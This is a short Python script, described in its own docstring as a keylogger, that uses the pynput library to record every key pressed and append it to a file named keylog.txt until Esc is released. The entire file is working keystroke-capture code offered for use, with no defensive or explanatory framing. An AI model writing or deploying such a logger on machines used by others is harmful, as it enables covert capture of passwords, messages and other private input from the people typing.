#!/bin/python3

"""Keylogger script to capture keystrokes and save them to a file."""

import pynput
from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as f:
        f.write(f"{key} pressed\n")

def on_release(key):
    if key == Key.esc:
        return False
  
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()